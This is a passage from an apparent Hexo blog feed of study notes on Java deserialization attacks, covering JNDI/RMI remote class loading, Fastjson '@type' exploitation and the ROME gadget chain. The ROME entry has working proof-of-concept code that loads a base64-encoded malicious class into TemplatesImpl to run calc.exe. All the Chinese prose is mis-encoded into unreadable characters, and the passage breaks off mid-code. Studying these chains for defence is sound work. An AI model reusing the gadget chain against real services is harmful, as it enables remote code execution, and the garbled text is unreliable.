è½½ç±»è¿™ä¸ªæŠ€æœ¯å°±æ˜¯ä¸ºäº†å®ç°ï¼Œå½“æœ¬åœ°æ²¡æœ‰å®šä¹‰è¿œç¨‹å¯¹è±¡æ‰€å¯¹åº”çš„ç±»çš„æ—¶å€™ï¼Œè¿˜èƒ½å¯¹è¿œç¨‹å¯¹è±¡è¿›è¡Œè°ƒç”¨ã€‚</p><p>å…·ä½“å®ç°é€»è¾‘ä¸ºï¼š</p><ul><li><p>å®¢æˆ·ç«¯ä½¿ç”¨lookupå‡½æ•°è®¿é—®ä¸€ä¸ªæœ¬åœ°ä¸å­˜åœ¨å¯¹åº”ç±»çš„è¿œç¨‹å¯¹è±¡</p></li><li><p>æœåŠ¡ç«¯ä¼šè¿”å›ä¸€ä¸ªreferenceå¯¹è±¡ï¼Œå¯¹è±¡ä¸­ä¼šæŒ‡å®šä¸€ä¸ªè¿œç¨‹ç±»è®©å…¶å»ä¸‹è½½</p></li><li><p>å®¢æˆ·ç«¯ä¸‹è½½è¿œç¨‹ç±»å¹¶å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è°ƒç”¨è¿œç¨‹ç±»çš„<strong>getObjectInstance</strong>å‡½æ•°è·å–å¤–éƒ¨è¿œç¨‹å¯¹è±¡å®ä¾‹ã€‚</p><p>ç»¼ä¸Šï¼Œå¦‚æœæˆ‘ä»¬<strong>å¯ä»¥æ§åˆ¶lookupå‡½æ•°çš„å€¼</strong>ï¼Œé‚£ä¹ˆè®©å…¶è®¿é—®ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„æ¶æ„rmiæœåŠ¡å™¨ï¼Œè®©å…¶ä¸‹è½½æˆ‘ä»¬æ„é€ çš„æ¶æ„classæ–‡ä»¶å¹¶å®ä¾‹è¯ï¼Œå³å¯å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p></li></ul><h2 id="RMI-LDAPæ³¨å…¥ç‰ˆæœ¬é—®é¢˜"><a href="#RMI-LDAPæ³¨å…¥ç‰ˆæœ¬é—®é¢˜" class="headerlink" title="RMI+LDAPæ³¨å…¥ç‰ˆæœ¬é—®é¢˜"></a>RMI+LDAPæ³¨å…¥ç‰ˆæœ¬é—®é¢˜</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071836554.png"></p><p>ç®€å•äº†è§£ä¸€ä¸‹ã€‚å› ä¸ºæƒ³å¼„fastjsonã€‚åç»­åœ¨å¤ä¹ å…·ä½“çš„å®ç°æ­¥éª¤ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjsonï¼ˆå…¥é—¨ï¼‰</title>
    <link href="/2022/03/07/Fastjson%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/"/>
    <url>/2022/03/07/Fastjson%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjsonï¼ˆå…¥é—¨ï¼‰"><a href="#Fastjsonï¼ˆå…¥é—¨ï¼‰" class="headerlink" title="Fastjsonï¼ˆå…¥é—¨ï¼‰"></a>Fastjsonï¼ˆå…¥é—¨ï¼‰</h1><p>è·Ÿç€å…ˆçŸ¥ç¤¾åŒºå†æ¥å¤ä¹ ä¸€ä¸‹ã€‚æœ¬æ–‡çº¯æŒ‰ç…§å…ˆçŸ¥ç¤¾åŒºçš„å¤ä¹ ã€‚åŸºæœ¬é›·åŒã€‚<a href="https://xz.aliyun.com/t/8979">https://xz.aliyun.com/t/8979</a></p><h2 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;è¿™é‡Œæ˜¯æ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">20</span>);<br>        person.setName(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> JSON.toJSONString(person, SerializerFeature.WriteClassName);<br>        System.out.println(s);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>SerializerFeature.WriteClassName</code>æ˜¯<code>toJSONString</code>è®¾ç½®çš„ä¸€ä¸ªå±æ€§å€¼ï¼Œè®¾ç½®ä¹‹ååœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¤šå†™å…¥ä¸€ä¸ª<code>@type</code>ï¼Œå³å†™ä¸Šè¢«åºåˆ—åŒ–çš„ç±»åï¼Œ<code>type</code>å¯ä»¥æŒ‡å®šååºåˆ—åŒ–çš„ç±»ï¼Œå¹¶ä¸”è°ƒç”¨å…¶<code>getter/setter/is</code>æ–¹æ³•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734193.png" alt="QQæˆªå›¾20220307161936"></p><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><p>ä¸¤ç§ååºåˆ—åŒ–çš„æ–¹å¼ã€‚<strong>parseObject</strong>å’Œ<strong>parse</strong>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnSerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;xsw6a\&quot;&#125;&quot;</span>;<br>        System.out.println(JSON.parse(s));<br>        System.out.println(JSON.parseObject(s));<br>        System.out.println(JSON.parseObject(s,Person.class));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œåªæœ‰ç¬¬ä¸‰æ­¥æ‰æŒ‡æ˜äº†å¯¹è±¡ï¼Œå¹¶ä¸”è®²Personååºåˆ—ã€‚è€Œä¸”è¿™é‡Œ<strong>å¹¶æ²¡æœ‰è§¦å‘getteræ–¹æ³•ã€‚</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734792.png" alt="QQæˆªå›¾20220307162915"></p><p>è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ç†è§£åˆ°@typeçš„ä½œç”¨äº†ã€‚æŒ‡å®šä¸€ä¸ªç±»ååºåˆ—åŒ–ã€‚<br>çœ‹çœ‹æ•ˆæœã€‚åˆ†åˆ«æµ‹è¯•ã€‚</p><h3 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse()"></a>JSON.parse()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;xsw6a.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;xsw6a\&quot;&#125;&quot;</span>;<br>   System.out.println(JSON.parse(s));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734823.png" alt="QQæˆªå›¾20220307163225"></p><p><strong>æ²¡æœ‰è§¦å‘getteræ–¹æ³•ã€‚</strong></p><h3 id="JSON-parseObject"><a href="#JSON-parseObject" class="headerlink" title="JSON.parseObject()"></a>JSON.parseObject()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;xsw6a.Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;xsw6a\&quot;&#125;&quot;</span>;<br>       System.out.println(JSON.parseObject(s));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071634121.png" alt="QQæˆªå›¾20220307163400"></p><p>å‡è§¦å‘ã€‚<br>é‚£æˆ‘ä»¬å°±å¯ä»¥æ€è€ƒè¿™æ ·çš„æŒ‡å®šç±»ååºåˆ—åŒ–ã€‚è‚¯å®šä¼šé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚<br>åªè¦åœ¨setterã€getterã€isä¸­æ·»åŠ æ¶æ„å‘½ä»¤ã€‚</p><h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>åœ¨åˆ†åˆ«å¯¹åº”çš„åœ°æ–¹æ·»åŠ ã€‚å‘ç°å‡å¯å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><h2 id="ååºåˆ—åŒ–çš„æµç¨‹"><a href="#ååºåˆ—åŒ–çš„æµç¨‹" class="headerlink" title="ååºåˆ—åŒ–çš„æµç¨‹"></a>ååºåˆ—åŒ–çš„æµç¨‹</h2><p>è¿™é‡Œåªè¯´ä¸€äº›å…³é”®éƒ¨åˆ†ã€‚ï¼ˆä¸ªäººè®¤ä¸ºï¼‰</p><p>é€šè¿‡è¿™é‡Œåˆ¤æ–­çš„ä¸º12ã€‚<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071721973.png" alt="QQæˆªå›¾20220307172125"></p><p>ä¼šæ¥åˆ°è¿™é‡Œã€‚è¿™é‡Œçš„<strong>LBRACE&#x3D;12</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734973.png" alt="QQæˆªå›¾20220307172241"></p><p><strong>scanSymbol</strong>è·å–åˆ°äº†æŒ‡å®šçš„@typeç±»ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734456.png" alt="QQæˆªå›¾20220307172427"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734100.png" alt="QQæˆªå›¾20220307172608"></p><p>åé¢è·Ÿè¿›ä¼šçŸ¥é“è¿‡æ»¤äº†ååºåˆ—åŒ–çš„ç±»ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203071734839.png" alt="QQæˆªå›¾20220307172959"></p><p>åé¢åº”è¯¥è¦å­¦ä¹ ä¸€ä¸‹RMIæ–¹é¢çš„ç›¸å…³çŸ¥è¯†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROMEé“¾</title>
    <link href="/2022/03/06/ROME%E9%93%BE/"/>
    <url>/2022/03/06/ROME%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h1><p>ç»ˆäºæŠŠä»–å¼„æ˜ç™½äº†ã€‚<br>å…ˆæ¥çœ‹çœ‹åˆ©ç”¨é“¾ã€‚</p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p><a href="http://rometools.github.io/rome/ROMEReleases/rome-1.0.jar">http://rometools.github.io/rome/ROMEReleases/rome-1.0.jar</a><br>è‡ªè¡Œå¯¼å…¥ä¸€ä¸‹ã€‚</p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EqualsBean</span>.</span></span>bean<span class="hljs-constructor">HashCode()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ToStringBean</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br></code></pre></td></tr></table></figure><h2 id="ObjectBean-toString"><a href="#ObjectBean-toString" class="headerlink" title="ObjectBean#toString()"></a>ObjectBean#toString()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061206065.png" alt="QQæˆªå›¾20220306120645"></p><p>è·Ÿè¿›<strong>toString()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420748.png" alt="QQæˆªå›¾20220306121009"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061210855.png" alt="QQæˆªå›¾20220306121028"></p><p>è·å–è°ƒç”¨é“¾ä¸­ä¸Šä¸€ä¸ªç±»æˆ– <code>_obj</code> å±æ€§ä¸­ä¿å­˜å¯¹è±¡çš„ç±»åï¼ˆå¯¹æœ¬é¢˜å¾—ä½œç”¨ä¸å¤§ï¼‰ï¼Œå¹¶è°ƒç”¨ç¬¬äºŒä¸ª toString æ–¹æ³•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420891.png" alt="QQæˆªå›¾20220306123426"></p><p>è¿™é‡Œä¼šå°†_objå®ä¾‹ä¸­çš„getteræ–¹æ³•å…¨éƒ¨æ‰§è¡Œï¼Œé‚£ä¹ˆå°±æƒ³åˆ°äº†,ä¹‹å‰åˆ†æçš„æ–‡ç« <br><strong>CommonsBeanutilsæ— ccä¾èµ–</strong>é‡Œé¢ç”¨åˆ°çš„è°ƒç”¨getteræ–¹æ³•ï¼Œä»è€ŒæˆåŠŸåŠ è½½æ¶æ„ç±»ã€‚</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rome</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br>        delegate.toString();<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯æˆåŠŸè§¦å‘è®¡ç®—å™¨ã€‚</p><h4 id="å…³é”®ä»£ç "><a href="#å…³é”®ä»£ç " class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br>  